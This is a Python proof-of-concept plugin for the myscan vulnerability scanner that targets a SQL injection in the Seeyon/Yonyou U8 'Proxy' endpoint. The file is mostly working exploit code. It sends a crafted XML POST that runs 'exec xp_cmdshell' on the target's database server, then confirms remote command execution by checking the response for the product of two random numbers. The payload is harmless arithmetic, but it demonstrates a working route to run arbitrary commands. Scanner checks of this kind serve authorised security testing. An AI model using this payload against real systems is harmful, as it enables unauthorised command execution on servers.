# !/usr/bin/env python3
# @Time    : 2020/9/12
# @Author  : caicai
# @File    : poc_seeyon_u8_sqli_2020.py

from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "seeyon_u8_sqli"
        self.vulmsg = "link https://www.hackbug.net/archives/111.html"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        r1 = get_random_num(3)
        r2 = get_random_num(3)
        req = {
            "method": "POST",
            "url": self.url + "Proxy",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "timeout": 10,
            "data": '''cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'set/A {r1}*{r2}'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'''.format(
                r1=r1, r2=r2),
            "verify": False,
            "allow_redirects": False
        }
        r = request(**req)
        if r is not None and r.status_code == 200 and (str(r1 * r2)).encode() in r.content:
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": parser_.geturl(),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
